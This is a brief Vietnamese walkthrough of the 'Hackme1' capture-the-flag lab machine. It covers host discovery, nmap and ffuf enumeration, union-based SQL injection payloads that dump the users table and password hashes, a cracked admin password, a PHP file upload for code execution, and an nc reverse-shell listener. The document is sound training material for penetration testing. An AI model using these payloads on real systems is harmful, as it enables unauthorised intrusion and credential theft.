# Hackme1
***

### Network Scanning

Đầu tiên tìm địa chỉ ip mục tiêu

```sudo netdiscover -i eth0 -r 192.168.169.0/24```

![](images/1.png)

**Target IP: 192.168.169.139**

Tiếp theo scan các dịch vụ và cổng đang mở

```sudo nmap -sV -O 192.168.169.139```

![](images/2.png)

+ Port 22: SSH
+ Port 80: Apache httpd 2.4.34

### ENUMERATION

Discovery

```ffuf -w /usr/share/wordlists/dirb/common.txt -e .php,.zip,.txt -u http://192.168.169.139/FUZZ```

![](images/7.png)

Thử truy cập vào port 80

![](images/3.png)

Hiện thị một trang login và sign up

![](images/4.png)

Thử đăng nhập, hiện giao diện cho phép tìm kiếm

![](images/5.png)

![](images/6.png)

Thử SQLi

```' UNION SELECT null,null,null-- a```

![](images/8.png)

```' UNION SELECT null,table_name,null FROM information_schema.tables-- a```


![](images/9.png)

Tìm thấy một bảng ```users``` 

```' UNION SELECT null,column_name,data_type FROM information_schema.columns WHERE table_name='users'-- a ```

![](images/10.png)

```' UNION SELECT user,pasword,name FROM users-- a```

![](images/11.png)

Thu được một bảng hash


![](images/12.png)

Sau khi crack password thu được mật khẩu ```superadmin:Uncrackable```

Sau khi đăng nhập với tài khoản ```superadmin``` được điều hướng tới trang ```welcomeadmin.php```

![](images/13.png)

Trang web cho biết upload file, thử upload file test.php

```<?php phpinfo(); ?>```

Sau khi truy cập thì thấy lệnh ```phpinfo()``` được thực thi, tiếp theo có thể thực hiện upload 1 reverse .

```nc -lvnp 1234```

![](images/15.png)

Tìm thấy một file thú vị được set quyền SUID

![](images/16.png)

## COMPLETE!!!